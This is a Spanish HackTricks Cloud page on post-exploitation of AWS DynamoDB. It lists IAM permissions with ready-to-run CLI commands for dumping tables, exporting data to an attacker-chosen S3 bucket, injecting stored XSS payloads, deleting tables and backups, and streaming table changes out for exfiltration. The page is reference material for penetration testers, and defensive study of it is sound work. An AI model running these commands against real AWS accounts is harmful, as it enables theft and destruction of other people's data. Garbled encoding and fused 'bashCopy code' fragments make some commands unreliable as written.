# AWS - Post Explotaci贸n en DynamoDB

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## DynamoDB

Para m谩s informaci贸n, consulta:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

Un atacante con estos permisos podr谩 **obtener elementos de las tablas por la clave primaria** (no puedes simplemente pedir todos los datos de la tabla). Esto significa que necesitas conocer las claves primarias (puedes obtener esto al obtener los metadatos de la tabla (`describe-table`). 

{% tabs %}
{% tab title="archivo json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}

**Impacto Potencial:** Privesc indirecto localizando informaci贸n sensible en la tabla

### `dynamodb:GetItem`

**Similar a los permisos anteriores**, este permite a un posible atacante leer valores de solo 1 tabla dado el clave primaria de la entrada a recuperar:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Con este permiso tambi茅n es posible utilizar el m茅todo **`transact-get-items`** como:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Impacto Potencial:** Escalada de privilegios indirecta localizando informaci贸n sensible en la tabla

### `dynamodb:Query`

**Similar a los permisos anteriores**, este permite a un atacante potencial leer valores de solo 1 tabla dado el clave primaria de la entrada a recuperar. Permite usar un [subconjunto de comparaciones](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), pero la 煤nica comparaci贸n permitida con la clave primaria (que debe aparecer) es "EQ", por lo que no se puede usar una comparaci贸n para obtener toda la DB en una solicitud.

{% tabs %}
{% tab title="archivo json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="en l铆nea" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Impacto Potencial:** Privesc indirecto localizando informaci贸n sensible en la tabla

### `dynamodb:Scan`

Puedes usar este permiso para **vaciar toda la tabla f谩cilmente**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Impacto Potencial:** Escalada de privilegios indirecta al localizar informaci贸n sensible en la tabla

### `dynamodb:PartiQLSelect`

Puedes usar este permiso para **vaciar toda la tabla f谩cilmente**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Este permiso tambi茅n permite realizar `batch-execute-statement` como:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
pero necesitas especificar la clave primaria con un valor, por lo que no es tan 煤til.

**Impacto Potencial:** Escalada de privilegios indirecta al localizar informaci贸n sensible en la tabla

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Este permiso permitir谩 a un atacante **exportar toda la tabla a un bucket de S3** de su elecci贸n:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Tenga en cuenta que para que esto funcione, la tabla necesita tener habilitado el punto de recuperaci贸n en el tiempo, puede verificar si la tabla lo tiene con:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Si no est谩 habilitado, necesitar谩s **habilitarlo** y para eso necesitas el permiso **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Impacto Potencial:** Escalada de privilegios indirecta al localizar informaci贸n sensible en la tabla

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup`)

Con estos permisos, un atacante podr铆a **crear una nueva tabla a partir de una copia de seguridad** (o incluso crear una copia de seguridad para luego restaurarla en una tabla diferente). Luego, con los permisos necesarios, podr铆a verificar **informaci贸n** de las copias de seguridad que **podr铆a no estar ya en la** tabla de producci贸n.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Impacto Potencial:** Escalada de privilegios indirecta al localizar informaci贸n sensible en el respaldo de la tabla

### `dynamodb:PutItem`

Este permiso permite a los usuarios **a帽adir un nuevo elemento a la tabla o reemplazar un elemento existente** con uno nuevo. Si ya existe un elemento con la misma clave primaria, el **elemento completo ser谩 reemplazado** por el nuevo. Si la clave primaria no existe, se **crear谩** un nuevo elemento con la clave primaria especificada.

{% tabs %}
{% tab title="Ejemplo XSS" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
```markdown
{% endcode %}
{% endtab %}
```

```markdown
{% tab title="Ejemplo de IA" %}
```
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Impacto Potencial:** Explotaci贸n de vulnerabilidades/omisiones adicionales al poder agregar/modificar datos en una tabla de DynamoDB

### `dynamodb:UpdateItem`

Este permiso permite a los usuarios **modificar los atributos existentes de un elemento o agregar nuevos atributos a un elemento**. No **reemplaza** el elemento completo; solo actualiza los atributos especificados. Si la clave primaria no existe en la tabla, la operaci贸n **crear谩 un nuevo elemento** con la clave primaria especificada y establecer谩 los atributos especificados en la expresi贸n de actualizaci贸n.

{% tabs %}
{% tab title="Ejemplo XSS" %}
{% code overflow="wrap" %}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Ejemplo de IA" %}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Impacto Potencial:** Explotaci贸n de vulnerabilidades/omisiones adicionales al poder a帽adir/modificar datos en una tabla de DynamoDB

### `dynamodb:DeleteTable`

Un atacante con este permiso puede **eliminar una tabla de DynamoDB, causando p茅rdida de datos**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Impacto potencial**: P茅rdida de datos y alteraci贸n de los servicios que dependen de la tabla eliminada.

### `dynamodb:DeleteBackup`

Un atacante con este permiso puede **eliminar una copia de seguridad de DynamoDB, lo que podr铆a causar p茅rdida de datos en caso de un escenario de recuperaci贸n de desastres**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Impacto potencial**: P茅rdida de datos e incapacidad para recuperarse de una copia de seguridad durante un escenario de recuperaci贸n de desastres.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Probar si esto realmente funciona
{% endhint %}

Un atacante con estos permisos puede **habilitar un stream en una tabla de DynamoDB, actualizar la tabla para comenzar a transmitir cambios y luego acceder al stream para monitorear los cambios en la tabla en tiempo real**. Esto permite al atacante monitorear y exfiltrar cambios de datos, lo que podr铆a llevar a una fuga de datos.

1. Habilitar un stream en una tabla de DynamoDB:
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Describa el stream para obtener el ARN y otros detalles:
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Obt茅n el iterador de shard usando el ARN del stream:
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Utiliza el iterador de shard para acceder y exfiltrar datos del stream:
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Impacto potencial**: Monitoreo en tiempo real y fuga de datos de los cambios en la tabla de DynamoDB.

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
